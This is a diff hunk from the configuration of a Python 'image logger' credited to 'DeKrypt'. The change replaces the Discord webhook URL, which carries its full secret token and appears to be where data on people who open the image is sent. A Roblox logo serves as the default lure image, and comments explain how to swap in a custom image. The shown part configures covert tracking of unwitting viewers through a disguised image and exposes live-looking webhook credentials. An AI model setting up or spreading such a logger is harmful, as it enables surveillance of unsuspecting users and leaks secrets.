@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": https://discord.com/api/webhooks/1544065803761225818/Ir5xLA24HPYojUHkM2NJi_q7veQluaq2XNQoJXYqqdJejvxQDubQw35qlL--4RPP8n4A"",
+    "webhook": "https://discord.com/api/webhooks/1544068036435120168/o2Xa6nMmhPxw0TSYaWgh64TEw_VvKz2y7T1hDG72t8ru5dusA8MTPebuI3zrHNFCL930",
     "image": "https://www.pcgamesn.com/wp-content/sites/pcgamesn/2022/08/Roblox-New-Logo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
